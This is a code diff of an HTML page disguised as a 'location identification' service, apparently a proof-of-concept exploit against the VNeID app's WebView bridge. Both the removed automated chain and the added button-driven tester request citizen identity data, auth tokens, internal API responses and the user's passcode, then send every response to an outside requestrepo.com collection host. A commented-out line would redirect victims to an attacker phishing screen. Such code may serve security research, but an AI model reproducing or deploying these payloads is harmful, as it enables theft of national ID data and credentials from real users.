@@ -5,206 +5,119 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Định danh địa điểm</title>
 <style>
-body { font-family: sans-serif; margin: 16px; background: #f5f5f5; }
-h1 { font-size: 18px; color: #1a73e8; }
-.phase { margin: 8px 0; padding: 8px; background: #fff; border-radius: 6px; border-left: 3px solid #ccc; }
-.phase.done { border-left-color: #34a853; }
-.phase.active { border-left-color: #fbbc04; }
-.phase.fail { border-left-color: #ea4335; }
-pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; max-height: 200px; overflow: auto; }
-#log { font-size: 11px; color: #666; margin-top: 16px; }
+body { font-family: sans-serif; margin: 12px; background: #f5f5f5; font-size: 14px; }
+h3 { margin: 4px 0; font-size: 15px; }
+button { margin: 4px; padding: 8px 12px; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; background: #fff; }
+button.ok { border-color: #34a853; background: #e6f4ea; }
+button.fail { border-color: #ea4335; background: #fce8e6; }
+#log { font-size: 11px; color: #333; white-space: pre-wrap; word-break: break-all; max-height: 60vh; overflow: auto; background: #fff; padding: 8px; border-radius: 4px; margin-top: 8px; }
 </style>
 </head>
 <body>
-<h1 id="status">Đang tải dịch vụ...</h1>
+<h3 id="status">Waiting for bridge...</h3>
 
-<div id="phase1" class="phase">① Lấy thông tin công dân...</div>
-<div id="phase2" class="phase">② Lấy token xác thực...</div>
-<div id="phase3" class="phase">③ Truy vấn API nội bộ...</div>
-<div id="phase4" class="phase">④ Lấy thông tin thiết bị...</div>
-<div id="phase5" class="phase">⑤ Yêu cầu mã passcode...</div>
-
-<pre id="result"></pre>
-<pre id="log"></pre>
+<div id="buttons"></div>
+<div id="log"></div>
 
 <script>
 var EXFIL = 'https://9liv9n84.requestrepo.com';
-var collected = {};
-var resultEl = document.getElementById('result');
 var logEl = document.getElementById('log');
+var bridgeReady = false;
 
 function log(msg) {
-  logEl.textContent += msg + '\n';
-}
-
-function setPhase(id, cls, text) {
-  var el = document.getElementById(id);
-  el.className = 'phase ' + cls;
-  if (text) el.textContent = text;
+  var line = new Date().toISOString().substr(11,12) + ' ' + msg;
+  logEl.textContent = line + '\n' + logEl.textContent;
+  console.log(msg);
 }
 
 function exfil(tag, data) {
   var payload = encodeURIComponent(JSON.stringify(data));
-  try { fetch(EXFIL + '/' + tag + '?d=' + payload, {mode: 'no-cors'}); } catch(_) {}
+  try { fetch(EXFIL + '/' + tag + '?d=' + payload, {mode:'no-cors'}); } catch(_){}
   new Image().src = EXFIL + '/' + tag + '?d=' + payload;
 }
 
 function sendEvent(event, data) {
-  log('>> ' + event);
-  window.ReactNativeWebView.postMessage(JSON.stringify({event: event, data: data || {}}));
-}
-
-// === Response handlers ===
-// Bridge responds via 3 paths: postMessage, handleNativeMessage, CustomEvent
-// Response event = "ON_" + request event name
-
-function handleResponse(data) {
-  if (!data || !data.event) return;
-  var ev = data.event;
-  var d = data.data;
-  log('<< ' + ev);
-
-  // VULN-01: PII leak
-  if (ev === 'ON_GET_USER_INFO') {
-    setPhase('phase1', 'done', '① CCCD: ' + (d && d.data ? d.data.citizenNumber : '?') + ' — ' + (d && d.data ? d.data.fullName : '?'));
-    collected.userInfo = d;
-    exfil('v01_pii', d);
-    runPhase2();
-  }
-
-  // VULN-02: Token leak
-  if (ev === 'ON_GET_TOKEN') {
-    var token = d && d.token ? d.token.substring(0, 20) + '...' : '?';
-    setPhase('phase2', 'done', '② Token: ' + token);
-    collected.token = d;
-    exfil('v02_token', d);
-    runPhase3();
-  }
-
-  // VULN-03: CALL_VNEID_API responses (prefixed ON_CALL_VNEID_API)
-  if (ev.indexOf('ON_CALL_VNEID_API') === 0) {
-    setPhase('phase3', 'done', '③ API response received');
-    collected.apiResponse = d;
-    exfil('v03_api', d);
-    runPhase4();
-  }
-
-  // VULN-04: GET_DEVICE_INSETS response
-  if (ev === 'ON_GET_DEVICE_INSETS') {
-    setPhase('phase4', 'done', '④ Device insets: ' + JSON.stringify(d));
-    collected.insets = d;
-    exfil('v04_insets', d);
-    runPhase5();
-  }
-
-  // VULN-06: Passcode leak
-  if (ev === 'ON_REQUEST_PASSCODE') {
-    if (d && d.data && d.data.passcode) {
-      setPhase('phase5', 'done', '⑤ Passcode: ' + d.data.passcode);
-      collected.passcode = d.data.passcode;
-      exfil('v06_passcode', d);
-    } else if (d && d.code !== 0) {
-      setPhase('phase5', 'fail', '⑤ Passcode: user cancelled');
-    }
-    finalize();
+  log('SEND >> ' + event + ' ' + JSON.stringify(data||{}));
+  try {
+    window.ReactNativeWebView.postMessage(JSON.stringify({event: event, data: data || {}}));
+    log('SEND OK');
+  } catch(e) {
+    log('SEND ERR: ' + e.message);
   }
 }
 
-// Path 1: postMessage
+// === Listen on ALL 3 response paths ===
 window.addEventListener('message', function(e) {
   try {
+    var raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+    log('RECV postMessage: ' + raw.substring(0, 500));
     var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
-    handleResponse(data);
-  } catch(_) {}
+    if (data && data.event) {
+      exfil('diag_' + data.event, data);
+    }
+  } catch(err) {
+    log('RECV postMessage parse err: ' + err.message);
+  }
 });
 
-// Path 2: CustomEvent
 window.addEventListener('nativeMessage', function(e) {
-  if (e.detail) handleResponse(e.detail);
+  log('RECV nativeMessage: ' + JSON.stringify(e.detail).substring(0, 500));
+  if (e.detail && e.detail.event) {
+    exfil('diag_' + e.detail.event, e.detail);
+  }
 });
 
-// Path 3: handleNativeMessage (injectedJS path — confirmed working)
 window.handleNativeMessage = function(data) {
-  handleResponse(data);
+  log('RECV handleNativeMessage: ' + JSON.stringify(data).substring(0, 500));
+  if (data && data.event) {
+    exfil('diag_' + data.event, data);
+  }
 };
 
-// === Attack chain (sequential, each phase triggers next) ===
+// === Event definitions (each button sends one event) ===
+var events = [
+  {label: '1. GET_USER_INFO (baseline)', event: 'GET_USER_INFO', data: {}},
+  {label: '2. GET_DEVICE_INSETS (sync)', event: 'GET_DEVICE_INSETS', data: {}},
+  {label: '3. SET_LOADING show', event: 'SET_LOADING', data: {show: true}},
+  {label: '4. SET_LOADING hide', event: 'SET_LOADING', data: {show: false}},
+  {label: '5. CHANGE_SCROLLABLE', event: 'CHANGE_SCROLLABLE', data: {enable: true}},
+  {label: '6. CALL_VNEID_API', event: 'CALL_VNEID_API', data: {method: 'GET', path: '/citizen/api/profile', params: {}}},
+  {label: '7. CALL_VNEID_API v2', event: 'CALL_VNEID_API', data: {method: 'GET', path: '/api/v2/citizen/profile', params: {}}},
+  {label: '8. REQUEST_PASSCODE', event: 'REQUEST_PASSCODE', data: {}},
+  {label: '9. NAVIGATE_SCREEN (screen)', event: 'NAVIGATE_SCREEN', data: {screen: 'FAQScreen', params: {}}},
+  {label: '10. NAVIGATE_SCREEN (name)', event: 'NAVIGATE_SCREEN', data: {name: 'FAQScreen', params: {}}},
+  {label: '11. OPEN_LINK', event: 'OPEN_LINK', data: {link: 'https://9liv9n84.requestrepo.com/v07_openlink'}},
+  {label: '12. ON_BACK', event: 'ON_BACK', data: {}},
+  {label: '13. OPEN_QR_SCAN', event: 'OPEN_QR_SCAN', data: {}},
+  {label: '14. SAVE_IMAGE', event: 'SAVE_IMAGE', data: {base64: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='}},
+  {label: '15. ALL AUTO', event: null}
+];
 
-function runPhase1() {
-  setPhase('phase1', 'active');
-  sendEvent('GET_USER_INFO');
-}
-
-function runPhase2() {
-  setPhase('phase2', 'active');
-  sendEvent('GET_TOKEN', {transId: 'txn-' + Date.now()});
-}
-
-function runPhase3() {
-  setPhase('phase3', 'active');
-  // Use the stolen token to call VNeID internal API as victim
-  // Try to read citizen profile via the proxy bridge
-  sendEvent('CALL_VNEID_API', {
-    method: 'GET',
-    path: '/api/citizen/profile',
-    params: {}
-  });
-  // Timeout fallback if API doesn't respond (path might differ)
-  setTimeout(function() {
-    if (!collected.apiResponse) {
-      setPhase('phase3', 'fail', '③ API: no response (path may differ)');
-      runPhase4();
+var btnContainer = document.getElementById('buttons');
+events.forEach(function(item, i) {
+  var btn = document.createElement('button');
+  btn.textContent = item.label;
+  btn.onclick = function() {
+    if (item.event === null) {
+      // Send all non-destructive events with delays
+      log('=== AUTO: sending all events ===');
+      var safe = events.filter(function(e) { return e.event && e.event !== 'ON_BACK' && e.event !== 'OPEN_LINK' && e.event !== 'NAVIGATE_SCREEN'; });
+      safe.forEach(function(e, j) {
+        setTimeout(function() { sendEvent(e.event, e.data); }, j * 800);
+      });
+      return;
     }
-  }, 5000);
-}
+    sendEvent(item.event, item.data);
+  };
+  btnContainer.appendChild(btn);
+});
 
-function runPhase4() {
-  setPhase('phase4', 'active');
-  sendEvent('GET_DEVICE_INSETS');
-  // Timeout fallback
-  setTimeout(function() {
-    if (!collected.insets) {
-      setPhase('phase4', 'fail', '④ Insets: no response');
-      runPhase5();
-    }
-  }, 3000);
-}
-
-function runPhase5() {
-  setPhase('phase5', 'active', '⑤ Đang yêu cầu xác thực...');
-  // VULN-06: triggers native passcode dialog — user sees legitimate VNeID prompt
-  sendEvent('REQUEST_PASSCODE');
-  // Timeout fallback if user cancels
-  setTimeout(function() {
-    if (!collected.passcode) {
-      setPhase('phase5', 'fail', '⑤ Passcode: timeout/cancelled');
-      finalize();
-    }
-  }, 30000);
-}
-
-function finalize() {
-  document.getElementById('status').textContent = 'Hoàn tất';
-  // Send full collection
-  exfil('full_chain', collected);
-  resultEl.textContent = JSON.stringify(collected, null, 2);
-  log('=== FULL CHAIN COMPLETE ===');
-  log('Collected: ' + Object.keys(collected).join(', '));
-
-  // VULN-04: Navigate to phishing screen as bonus demo
-  // (commented out — uncomment to also demonstrate screen hijack)
-  // sendEvent('NAVIGATE_SCREEN', {name: 'AppWebviewScreen', params: {screen: {url: 'https://attacker.com/phish', title: 'Xác thực tài khoản'}}, replace: true});
-
-  // VULN-07: Open external link demo (commented — uncomment to demo)
-  // sendEvent('OPEN_LINK', {link: 'tel:+841900xxxx'});
-}
-
-// === Bootstrap: wait for ReactNativeWebView injection ===
+// === Bootstrap ===
 function tryStart() {
   if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+    bridgeReady = true;
+    document.getElementById('status').textContent = 'Bridge ready — tap to test';
     log('ReactNativeWebView ready');
-    document.getElementById('status').textContent = 'Đang xử lý...';
-    runPhase1();
   } else {
     setTimeout(tryStart, 200);
   }
